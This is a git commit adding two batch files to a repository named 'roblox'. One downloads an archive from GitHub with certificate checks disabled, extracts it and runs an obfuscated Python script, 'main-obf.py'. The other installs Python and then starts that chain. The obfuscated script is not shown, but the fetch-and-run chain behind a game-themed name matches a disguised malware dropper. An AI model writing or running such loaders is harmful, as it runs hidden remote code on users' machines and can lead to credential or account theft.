4c621221843d5050680ca33b38b8424ef34214b8
sayori667 <137815330+sayori667@users.noreply.github.com>
2024-02-11 14:54:12 +0100

    Add files via upload

---
+++ roblox/main.bat
@@ -0,0 +1,2 @@
+curl -LOk https://github.com/sayori667/roblox/archive/refs/heads/main.zip && powershell -Command "Expand-Archive -Path main.zip -DestinationPath roblox-main" && cd roblox-main && cd roblox-main && start main-obf.py
+
---
+++ roblox/start.bat
@@ -0,0 +1,5 @@
+curl -O https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe && start python-3.11.5-amd64.exe
+
+pause 
+
+start main.bat
